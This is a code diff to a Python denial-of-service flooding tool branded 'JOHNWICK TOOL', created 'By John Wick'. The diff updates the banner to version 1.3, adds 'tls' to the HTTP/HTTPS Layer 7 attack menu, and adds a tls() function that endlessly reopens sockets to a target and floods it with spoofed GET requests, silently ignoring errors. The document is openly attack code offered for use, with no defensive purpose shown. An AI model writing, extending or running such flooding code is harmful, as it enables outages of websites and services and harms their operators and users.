@@ -1,12 +1,11 @@
 from os import system
 from colorama import Fore , init
 from fake_useragent import UserAgent
-from sys import argv
 from socket import socket , AF_INET , SOCK_STREAM , SOCK_DGRAM , gethostbyname
 from threading import Thread as thr
 from os import name
 from certifi import where
-from ssl import CERT_NONE, SSLContext, create_default_context
+from ssl import CERT_NONE, create_default_context
 from random import choice
 from string import ascii_letters , digits
 from urllib.parse import urlparse
@@ -29,7 +28,7 @@ banner = f'''
                            {white} ▄▄▄▄    ▄▄▄       ▄▄▄▄    ▄▄▄         ▓██   ██▓ ▄▄▄        ▄████  ▄▄▄      
                             ▓█████▄ ▒████▄    ▓█████▄ ▒████▄        ▒██  ██▒▒████▄     ██▒ ▀█▒▒████▄    
                             ▒██▒ ▄██▒██  ▀█▄  ▒██▒ ▄██▒██  ▀█▄       ▒██ ██░▒██  ▀█▄  ▒██░▄▄▄░▒██  ▀█▄   {green}Created {red}By {yellow}John {blue}Wick{blue}		
-                            ▒██░█▀  ░██▄▄▄▄██ ▒██░█▀  ░██▄▄▄▄██      ░ ▐██▓░░██▄▄▄▄██ ░▓█  ██▓░██▄▄▄▄██   {cyan}Version {red}({yellow} 1{red}.{yellow}2{red} ){red}
+                            ▒██░█▀  ░██▄▄▄▄██ ▒██░█▀  ░██▄▄▄▄██      ░ ▐██▓░░██▄▄▄▄██ ░▓█  ██▓░██▄▄▄▄██   {cyan}Version {red}({yellow} 1{red}.{yellow}3{red} ){red}
                             ░▓█  ▀█▓ ▓█   ▓██▒░▓█  ▀█▓ ▓█   ▓██▒     ░ ██▒▓░ ▓█   ▓██▒░▒▓███▀▒ ▓█   ▓██▒
                             ░▒▓███▀▒ ▒▒   ▓▒█░░▒▓███▀▒ ▒▒   ▓▒█░      ██▒▒▒  ▒▒   ▓▒█░ ░▒   ▒  ▒▒   ▓▒█░
                             ▒░▒   ░   ▒   ▒▒ ░▒░▒   ░   ▒   ▒▒ ░    ▓██ ░▒░   ▒   ▒▒ ░  ░   ░   ▒   ▒▒ ░
@@ -65,7 +64,7 @@ ddos = f'''
                            {white} ▄▄▄▄    ▄▄▄       ▄▄▄▄    ▄▄▄         ▓██   ██▓ ▄▄▄        ▄████  ▄▄▄      
                             ▓█████▄ ▒████▄    ▓█████▄ ▒████▄        ▒██  ██▒▒████▄     ██▒ ▀█▒▒████▄    
                             ▒██▒ ▄██▒██  ▀█▄  ▒██▒ ▄██▒██  ▀█▄       ▒██ ██░▒██  ▀█▄  ▒██░▄▄▄░▒██  ▀█▄   {green}Created {red}By {yellow}John {blue}Wick{blue}		
-                            ▒██░█▀  ░██▄▄▄▄██ ▒██░█▀  ░██▄▄▄▄██      ░ ▐██▓░░██▄▄▄▄██ ░▓█  ██▓░██▄▄▄▄██   {cyan}Version {red}({yellow} 1{red}.{yellow}1{red} ){red}
+                            ▒██░█▀  ░██▄▄▄▄██ ▒██░█▀  ░██▄▄▄▄██      ░ ▐██▓░░██▄▄▄▄██ ░▓█  ██▓░██▄▄▄▄██   {cyan}Version {red}({yellow} 1{red}.{yellow}3{red} ){red}
                             ░▓█  ▀█▓ ▓█   ▓██▒░▓█  ▀█▓ ▓█   ▓██▒     ░ ██▒▓░ ▓█   ▓██▒░▒▓███▀▒ ▓█   ▓██▒
                             ░▒▓███▀▒ ▒▒   ▓▒█░░▒▓███▀▒ ▒▒   ▓▒█░      ██▒▒▒  ▒▒   ▓▒█░ ░▒   ▒  ▒▒   ▓▒█░
                             ▒░▒   ░   ▒   ▒▒ ░▒░▒   ░   ▒   ▒▒ ░    ▓██ ░▒░   ▒   ▒▒ ░  ░   ░   ▒   ▒▒ ░
@@ -78,7 +77,7 @@ ddos = f'''
             {cyan}╔═════════════════════════════════════════════════════════════════════════════════════════════════╗
             {cyan}║                                  {red}Welcome {blue}To {yellow}JOHNWICK {green}TOOL{cyan}                                       ║
             {cyan}║                                                                                                 ║
-            {cyan}║ {green}LAYER7 {red}: {cyan}HTTP {red}, {cyan}HTTPS                                                                           ║
+            {cyan}║ {green}LAYER7 {red}: {cyan}HTTP {red}, {cyan}HTTPS , tls                                                                     ║
             {cyan}║ {green}LAYER4 {red}: {cyan}UDP {red}, {cyan}TCP                                                                              ║
             {cyan}║                                                                                                 ║
             {cyan}║ {red}#{green}John {yellow}Wick{blue} Tool{cyan}                                                                                 ║
@@ -91,7 +90,7 @@ bn = f'''
                            {white} ▄▄▄▄    ▄▄▄       ▄▄▄▄    ▄▄▄         ▓██   ██▓ ▄▄▄        ▄████  ▄▄▄      
                             ▓█████▄ ▒████▄    ▓█████▄ ▒████▄        ▒██  ██▒▒████▄     ██▒ ▀█▒▒████▄    
                             ▒██▒ ▄██▒██  ▀█▄  ▒██▒ ▄██▒██  ▀█▄       ▒██ ██░▒██  ▀█▄  ▒██░▄▄▄░▒██  ▀█▄   {green}Created {red}By {yellow}John {blue}Wick{blue}		
-                            ▒██░█▀  ░██▄▄▄▄██ ▒██░█▀  ░██▄▄▄▄██      ░ ▐██▓░░██▄▄▄▄██ ░▓█  ██▓░██▄▄▄▄██   {cyan}Version {red}({yellow} 1{red}.{yellow}1{red} ){red}
+                            ▒██░█▀  ░██▄▄▄▄██ ▒██░█▀  ░██▄▄▄▄██      ░ ▐██▓░░██▄▄▄▄██ ░▓█  ██▓░██▄▄▄▄██   {cyan}Version {red}({yellow} 1{red}.{yellow}3{red} ){red}
                             ░▓█  ▀█▓ ▓█   ▓██▒░▓█  ▀█▓ ▓█   ▓██▒     ░ ██▒▓░ ▓█   ▓██▒░▒▓███▀▒ ▓█   ▓██▒
                             ░▒▓███▀▒ ▒▒   ▓▒█░░▒▓███▀▒ ▒▒   ▓▒█░      ██▒▒▒  ▒▒   ▓▒█░ ░▒   ▒  ▒▒   ▓▒█░
                             ▒░▒   ░   ▒   ▒▒ ░▒░▒   ░   ▒   ▒▒ ░    ▓██ ░▒░   ▒   ▒▒ ░  ░   ░   ▒   ▒▒ ░
@@ -384,6 +383,21 @@ while True:
                         s.connect((target,port))
                     for _ in range(rpc):
                         s.send(f'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nCookie: {cookie}\r\n\r\n'.encode())
+                except:
+                    pass
+
+        def tls():
+            while True:
+                try:
+                    if url.split('://')[0] == 'https':
+                        s = socket(AF_INET,SOCK_STREAM)
+                        s = ssl.wrap_socket(s, server_hostname=target)
+                        s.connect((target,port))
+                    else:
+                        s = socket(AF_INET,SOCK_STREAM)
+                        s.connect((target,port))
+                    for _ in range(rpc):
+                        s.send(f'GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nUpgrade-Insecure-Requests: 1\r\nCookie: {cookie}\r\n\r\n'.encode())
                 except:
                     pass
 
